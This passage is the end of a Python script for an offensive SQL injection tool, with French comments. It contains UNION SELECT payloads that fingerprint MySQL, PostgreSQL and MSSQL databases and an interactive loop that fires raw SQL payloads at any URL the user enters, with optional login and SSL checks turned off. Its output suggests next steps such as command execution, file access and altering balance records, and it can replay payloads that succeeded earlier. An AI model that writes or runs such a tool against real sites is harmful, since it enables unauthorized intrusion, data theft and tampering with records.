            candidates = [
                # MySQL
                ("database", "' UNION SELECT database(),2,3--", r"database\(\)\W*([a-zA-Z][a-zA-Z0-9_\-]{1,64})"),
                ("version",  "' UNION SELECT @@version,2,3--", r"(\d+\.[\d\.]+)"),
                ("user",     "' UNION SELECT user(),2,3--", r"([a-z0-9_\-\.]+@[a-z0-9_\-\.]+|[a-z0-9_\-\.]{3,})"),
                # PostgreSQL
                ("database", "' UNION SELECT current_database(),2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{1,64})"),
                ("version",  "' UNION SELECT version(),2,3--", r"postgresql[^\n\r]*?(\d+\.[\d\.]+)"),
                ("user",     "' UNION SELECT current_user,2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{2,})"),
                # MSSQL
                ("database", "' UNION SELECT DB_NAME(),2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{1,64})"),
                ("version",  "' UNION SELECT @@version,2,3--", r"(\d+\.[\d\.]+)"),
                ("user",     "' UNION SELECT SYSTEM_USER,2,3--", r"([a-zA-Z][a-zA-Z0-9_\-]{2,})"),
            ]
            for label, payload, regex in candidates:
                res = self.advanced_payload_test(target_url, payload, "DB Info Discovery", False, include_response_text=True)
                text = (res.get('response_text') or '')
                try:
                    m = re.search(regex, text, re.IGNORECASE)
                    if m and m.group(1):
                        if label not in info:
                            info[label] = m.group(1)
                except Exception:
                    continue
        except Exception:
            return info
        return info

    def display_battle_summary(self, attack, target_url, results, critical_hits):
        """Affiche le résumé de bataille"""
        print(f"\n{Colors.BOLD}💀" + "="*80 + "💀")
        print("🏴‍☠️ BATTLE SUMMARY 🏴‍☠️")
        print("💀" + "="*80 + "💀" + Colors.END)
        
        total_attacks = len(results)
        success_rate = (critical_hits / total_attacks) * 100 if total_attacks > 0 else 0
        defense_rate = 100 - success_rate
        
        summary_color = Colors.RED if critical_hits > 0 else Colors.GREEN
        
        print(f"🎯 Attack Vector: {Colors.CYAN}{attack['name']}{Colors.END}")
        print(f"🏴‍☠️ CVE Score: {Colors.RED}{Colors.BOLD}{attack['cvss']}{Colors.END}")
        print(f"🎯 Target: {target_url}")
        print(f"💣 Total Attacks: {total_attacks}")
        print(f"💀 Critical Hits: {summary_color}{critical_hits}{Colors.END}")
        print(f"📊 Penetration Rate: {summary_color}{success_rate:.1f}%{Colors.END}")
        print(f"🛡️ Defense Rate: {Colors.GREEN if defense_rate > 80 else Colors.YELLOW}{defense_rate:.1f}%{Colors.END}")
        
        if critical_hits > 0:
            print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}💀 TARGET COMPROMISED! 💀{Colors.END}")
            print(f"{Colors.RED}🚨 Critical vulnerabilities detected in target system{Colors.END}")
            print(f"{Colors.YELLOW}📋 Recommendations:{Colors.END}")
            print(f"  • Implement parameterized queries immediately")
            print(f"  • Deploy Web Application Firewall (WAF)")
            print(f"  • Update database software to latest versions")
            print(f"  • Implement input validation and sanitization")
            print(f"  • Regular security audits and penetration testing")
            # Dynamic exploit suggestions
            try:
                suggestions = self._recommend_exploits_for_results(results)
                if suggestions:
                    print(f"\n{Colors.BOLD}🎯 Suggested next actions:{Colors.END}")
                    for s in suggestions:
                        label = {
                            'data_extraction': 'Extract sensitive data (tables/columns)',
                            'database_info': 'Discover DB version/name/user and schema',
                            'file_operations': 'Read/Write files on server (if possible)',
                            'command_execution': 'Attempt system command execution (high risk)',
                            'update_balance': 'Modify data records (ex: balances)',
                            'blind_extraction': 'Blind/time-based data extraction'
                        }.get(s, s)
                        print(f"  - {s}: {label}")
            except Exception:
                pass
            
            # Lancement du module d'exploitation interactif
            vulnerable_results = [r for r in results if r.get('vulnerable', False)]
            if vulnerable_results:
                self.interactive_exploitation(target_url, vulnerable_results)
        else:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🛡️ TARGET DEFENDED SUCCESSFULLY 🛡️{Colors.END}")
            print(f"{Colors.GREEN}✅ No critical vulnerabilities detected{Colors.END}")
            print(f"{Colors.CYAN}🔒 Security posture appears robust against tested CVE attacks{Colors.END}")

    def save_battle_report(self, attack, target_url, results):
        """Sauvegarde le rapport de bataille"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"red_team_battle_report_{timestamp}.json"
        
        critical_results = [r for r in results if r.get('vulnerable', False)]
        
        report = {
            'mission_timestamp': datetime.now().isoformat(),
            'attack_vector': attack['name'],
            'cvss_score': attack['cvss'],
            'target_url': target_url,
            'total_attacks': len(results),
            'critical_hits': len(critical_results),
            'penetration_rate': (len(critical_results) / len(results)) * 100 if results else 0,
            'critical_payloads': critical_results,
            'full_battle_log': results,
            'threat_assessment': 'CRITICAL' if len(critical_results) > 0 else 'SECURED'
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"{Colors.GREEN}📁 Battle report saved: {filename}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}❌ Failed to save report: {e}{Colors.END}")

    def run(self):
        """Boucle principale du framework"""
        self.display_banner()
        
        while True:
            try:
                # Mode exécution rapide
                quick = 'n'
                try:
                    quick = input(f"{Colors.BOLD}Exécution rapide d'un SQL sur une URL (y/N)? {Colors.END}").strip().lower()
                except KeyboardInterrupt:
                    quick = 'n'
                if quick == 'y':
                    try:
                        target = input(f"{Colors.BOLD}URL cible: {Colors.END}").strip()
                        if target and not target.startswith(('http://','https://')):
                            target = 'https://' + target
                        method = input(f"{Colors.BOLD}Méthode (GET/POST) [GET]: {Colors.END}").strip().upper() or 'GET'
                        param = input(f"{Colors.BOLD}Nom du paramètre [q]: {Colors.END}").strip() or 'q'
                        sql = input(f"{Colors.BOLD}Payload SQL: {Colors.END}").strip()
                        if target and sql:
                            self.quick_execute_sql(target, sql, method=method, param_name=param)
                    except KeyboardInterrupt:
                        pass
                    # Après exécution rapide, proposer de continuer en mode normal
                    cont = input(f"\n{Colors.BOLD}Continuer avec le script normal (y/N)? {Colors.END}").strip().lower()
                    if cont != 'y':
                        break
                # Option de chargement d'une config précédente
                use_prev = 'n'
                try:
                    use_prev = input(f"{Colors.BOLD}Charger une configuration précédente (y/N)? {Colors.END}").strip().lower()
                except KeyboardInterrupt:
                    use_prev = 'n'
                if use_prev == 'y':
                    try:
                        cfg_path = input(f"{Colors.BOLD}Chemin du rapport JSON (red_team_battle_report_*.json): {Colors.END}").strip()
                        with open(cfg_path, 'r') as f:
                            cfg = json.load(f)
                        target_url = cfg.get('target_url') or input(f"{Colors.BOLD}URL cible (si absent du rapport): {Colors.END}").strip()
                        # Récupérer uniquement les payloads vulnérables
                        payloads = []
                        for entry in (cfg.get('full_battle_log') or cfg.get('critical_payloads') or []):
                            if entry.get('vulnerable') and entry.get('payload'):
                                payloads.append(entry['payload'])
                        payloads = list(dict.fromkeys(payloads))
                        if not payloads:
                            print(f"{Colors.YELLOW}ℹ️ Aucun payload vulnérable trouvé dans le rapport. Passage en mode normal.{Colors.END}")
                        else:
                            print(f"{Colors.CYAN}▶️ Relecture de {len(payloads)} payloads vulnérables pour {target_url}{Colors.END}")
                            self.execute_replay_payloads(target_url, payloads, attack_name='Replayed Loaded Payloads')
                            # Continuer boucle pour nouvelle mission
                            another = input(f"\n{Colors.BOLD}🎯 Launch another attack? (y/n): {Colors.END}").strip().lower()
                            if another != 'y':
                                break
                            print("\n" + "🔥"*50 + "\n")
                            continue
                    except Exception as e:
                        print(f"{Colors.RED}❌ Impossible de charger la configuration: {e}{Colors.END}")
                        # chute vers mode normal
                
                self.display_attack_arsenal()
                attack_choice, target_url, mode = self.get_target_info()
                
                # Confirmation de mission
                attack_name = self.attack_arsenal[attack_choice]['name']
                cvss_score = self.attack_arsenal[attack_choice]['cvss']
                mode_names = {
                    '1': '💣 Strike Standard',
                    '2': '⚡ Red Team Annihilation', 
                    '3': '🤖 ML-Enhanced Evasion'
                }
                
                print(f"\n{Colors.YELLOW}🎯 MISSION BRIEFING:{Colors.END}")
                print(f"Attack Vector: {Colors.BOLD}{attack_name}{Colors.END}")
                print(f"CVSS Score: {Colors.RED}{Colors.BOLD}{cvss_score}{Colors.END}")
                print(f"Target: {Colors.BOLD}{target_url}{Colors.END}")
                print(f"Engagement Mode: {Colors.BOLD}{mode_names[mode]}{Colors.END}")
                try:
                    do_login = input(f"\n{Colors.BOLD}🔐 Tenter une connexion (y/n)? {Colors.END}").strip().lower()
                except KeyboardInterrupt:
                    do_login = 'n'
                if do_login == 'y':
                    user = input(f"{Colors.BOLD}Username/Email: {Colors.END}").strip()
                    pwd = input(f"{Colors.BOLD}Password: {Colors.END}").strip()
                    try:
                        ignore_ssl = input(f"{Colors.BOLD}Ignore SSL certificate errors (y/N): {Colors.END}").strip().lower() == 'y'
                    except KeyboardInterrupt:
                        ignore_ssl = False
                    if ignore_ssl:
                        self.verify = False
                        try:
                            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                            print(f"{Colors.YELLOW}⚠️ SSL verification disabled for this session.{Colors.END}")
                        except Exception:
                            pass
                    # Overrides optionnels
                    try:
                        login_override = input(f"{Colors.BOLD}Login URL override (optional): {Colors.END}").strip()
                        selector_override = input(f"{Colors.BOLD}Form CSS selector override (optional): {Colors.END}").strip()
                        captcha_override = input(f"{Colors.BOLD}CAPTCHA URL override (optional): {Colors.END}").strip()
                        force_manual = input(f"{Colors.BOLD}Force manual CAPTCHA entry (y/N): {Colors.END}").strip().lower() == 'y'
                    except KeyboardInterrupt:
                        login_override = selector_override = captcha_override = ''
                        force_manual = False
                    self.login_to_site(
                        target_url,
                        user,
                        pwd,
                        login_url_override=login_override or None,
                        form_selector_override=selector_override or None,
                        captcha_url_override=captcha_override or None,
                        force_manual_captcha=force_manual
                    )
                
                confirm = input(f"\n{Colors.RED}{Colors.BOLD}🚨 AUTHORIZE ATTACK? (y/n): {Colors.END}").strip().lower()
                if confirm != 'y':
                    print(f"{Colors.YELLOW}🛑 Mission aborted by operator.{Colors.END}")
                    continue
                
                # Exécution selon le mode
                if mode == '1':
                    results = self.execute_standard_strike(attack_choice, target_url)
                elif mode == '2':
                    results = self.execute_annihilation_mode(attack_choice, target_url)
                else:  # mode == '3'
                    results = self.execute_ml_evasion_mode(attack_choice, target_url)
                
                # Sauvegarde du rapport
                if results:
                    save_report = input(f"\n{Colors.BOLD}💾 Save battle report? (y/n): {Colors.END}").strip().lower()
                    if save_report == 'y':
                        self.save_battle_report(self.attack_arsenal[attack_choice], target_url, results)
                
                # Nouvelle mission
                another = input(f"\n{Colors.BOLD}🎯 Launch another attack? (y/n): {Colors.END}").strip().lower()
                if another != 'y':
                    break
                    
                print("\n" + "🔥"*50 + "\n")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🏃 Emergency extraction initiated...{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}💥 System error: {e}{Colors.END}")
                print(f"{Colors.YELLOW}🔧 Continuing operations...{Colors.END}")

    def execute_replay_payloads(self, target_url, payloads, attack_name='Replayed Payloads'):
        """Exécute une liste de payloads chargés depuis un rapport précédent."""
        print(f"\n{Colors.BOLD}{Colors.RED}🔁 REPLAY MODE{Colors.END}")
        print(f"Attack: {attack_name}")
        print(f"Target: {Colors.UNDERLINE}{target_url}{Colors.END}")
        print(f"Payloads: {len(payloads)}")
        print("-" * 80)
        results = []
        critical_hits = 0
        for i, payload in enumerate(payloads, 1):
            print(f"\n{Colors.YELLOW}[{i}/{len(payloads)}] 🎯 Firing: {Colors.CYAN}{payload[:80]}{'...' if len(payload) > 80 else ''}{Colors.END}")
            result = self.advanced_payload_test(target_url, payload, attack_name, False)
            results.append(result)
            if result.get('vulnerable', False):
                critical_hits += 1
                print(f"  {Colors.BG_RED}{Colors.WHITE}{Colors.BOLD} 💀 CRITICAL HIT #{critical_hits} 💀 {Colors.END}")
                print(f"    Status: {result.get('status_code')} | Time: {result.get('response_time')}ms")
                print(f"    Score: {Colors.RED}{result.get('vulnerability_score', 0)}/15{Colors.END}")
            else:
                print(f"  {Colors.YELLOW}Target Resisted{Colors.END} | Score: {result.get('vulnerability_score', 0)}/15 | Time: {result.get('response_time', 0)}ms")
            time.sleep(0.3)
        # Résumé rapide
        fake_attack = {'name': attack_name, 'cvss': 'N/A'}
        self.display_battle_summary(fake_attack, target_url, results, critical_hits)
        return results

def main():
    """Point d'entrée principal"""
    try:
        print(f"{Colors.RED}🔥 Initializing Ultra-Advanced Red Team Framework...{Colors.END}")
        time.sleep(1)
        framework = UltraAdvancedSQLInjector()
        framework.run()
        print(f"\n{Colors.CYAN}🏁 Red Team operation completed.{Colors.END}")
        print(f"{Colors.YELLOW}Stay dangerous! 💀{Colors.END}")
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Operator disconnected.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}💥 Critical system failure: {e}{Colors.END}")
        print(f"{Colors.YELLOW}🚨 Report this incident to command.{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()